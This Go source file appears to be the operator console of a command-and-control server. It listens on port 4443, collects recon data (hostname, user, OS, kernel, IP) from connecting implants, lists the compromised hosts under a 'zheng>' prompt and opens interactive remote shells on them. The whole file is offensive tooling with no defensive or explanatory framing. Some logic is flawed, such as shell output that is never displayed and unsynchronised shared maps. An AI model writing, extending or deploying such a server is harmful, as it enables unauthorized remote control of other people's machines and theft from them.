package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

const PORT = "4443"

type Recon struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Kernel   string `json:"kernel"`
	IP       string `json:"ip"`
}

type Client struct {
	ID     int
	Conn   net.Conn
	Addr   string
	Recon  Recon
	Decoder *json.Decoder
	Encoder *json.Encoder
}

var (
	clients   = make(map[int]*Client)
	clientID  = 0
	nextID    = 1
)

func addClient(conn net.Conn, recon Recon) *Client {
	clientID++
	c := &Client{
		ID:      nextID,
		Conn:    conn,
		Addr:    conn.RemoteAddr().String(),
		Recon:   recon,
		Decoder: json.NewDecoder(conn),
		Encoder: json.NewEncoder(conn),
	}
	clients[nextID] = c
	nextID++
	return c
}

func removeClient(id int) {
	if c, ok := clients[id]; ok {
		c.Conn.Close()
		delete(clients, id)
	}
}

func listClients() {
	if len(clients) == 0 {
		fmt.Println("no connected clients")
		return
	}

	fmt.Println()
	fmt.Printf("%-4s %-21s %-15s %-15s %-10s %-10s\n", "ID", "ADDR", "IP", "HOSTNAME", "USER", "OS")
	fmt.Println(strings.Repeat("-", 75))
	for id, c := range clients {
		fmt.Printf("%-4d %-21s %-15s %-15s %-10s %-10s\n",
			id, c.Addr, c.Recon.IP, c.Recon.Hostname, c.Recon.Username, c.Recon.OS)
	}
	fmt.Println()
}

func sendCommand(c *Client, cmd string) error {
	return c.Encoder.Encode(map[string]string{"cmd": cmd})
}

func handleShell(c *Client) {
	fmt.Printf("entering shell on client %d (%s@%s)\n", c.ID, c.Recon.Username, c.Recon.Hostname)
	fmt.Println("type 'exit' to leave shell")

	// Send spawn command
	if err := sendCommand(c, "spawn_shell"); err != nil {
		fmt.Printf("failed to send command: %v\n", err)
		return
	}

	// Read responses until shell_ready
	for {
		var msg struct {
			Status string `json:"status"`
		}
		if err := c.Decoder.Decode(&msg); err != nil {
			fmt.Printf("connection lost: %v\n", err)
			return
		}
		if msg.Status == "shell_ready" {
			break
		}
	}

	// Shell mode - pipe stdout from client to our stdout
	go func() {
		for {
			var msg struct {
				Status string `json:"status"`
			}
			if err := c.Decoder.Decode(&msg); err != nil {
				return
			}
			if msg.Status == "shell_done" {
				fmt.Printf("\nshell exited on client %d\n", c.ID)
				return
			}
		}
	}()

	// Read stdin and send to client
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		line := scanner.Text()
		if line == "exit" {
			fmt.Printf("leaving shell on client %d\n", c.ID)
			return
		}
		// Send input to client shell
		fmt.Fprintf(c.Conn, "%s\n", line)
	}
}

func main() {
	listener, err := net.Listen("tcp", ":"+PORT)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to listen on :%s: %v\n", PORT, err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Fprintf(os.Stderr, "listening on :%s\n", PORT)

	// Accept connections in background
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				fmt.Fprintf(os.Stderr, "accept error: %v\n", err)
				continue
			}

			go handleConnection(conn)
		}
	}()

	// Command prompt
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("zheng> ")
		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		cmd := parts[0]

		switch cmd {
		case "/clients", "clients":
			listClients()

		case "shell":
			if len(parts) < 2 {
				// If only one client, use it
				if len(clients) == 1 {
					for _, c := range clients {
						handleShell(c)
					}
				} else if len(clients) == 0 {
					fmt.Println("no clients connected")
				} else {
					fmt.Println("usage: shell <client_id>")
				}
			} else {
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					fmt.Println("invalid client id")
					continue
				}
				if c, ok := clients[id]; ok {
					handleShell(c)
				} else {
					fmt.Printf("client %d not found\n", id)
				}
			}

		case "exit", "quit":
			fmt.Println("exiting...")
			for id := range clients {
				removeClient(id)
			}
			os.Exit(0)

		default:
			fmt.Printf("unknown command: %s\n", cmd)
			fmt.Println("commands: /clients, shell <id>, exit")
		}
	}
}

func handleConnection(conn net.Conn) {
	// Read recon info
	var recon Recon
	decoder := json.NewDecoder(conn)
	if err := decoder.Decode(&recon); err != nil {
		fmt.Fprintf(os.Stderr, "failed to read recon from %s: %v\n", conn.RemoteAddr(), err)
		conn.Close()
		return
	}

	c := addClient(conn, recon)
	fmt.Printf("\n[+] new client %d: %s@%s (%s) from %s\n",
		c.ID, recon.Username, recon.Hostname, recon.IP, c.Addr)
	fmt.Printf("zheng> ")
}
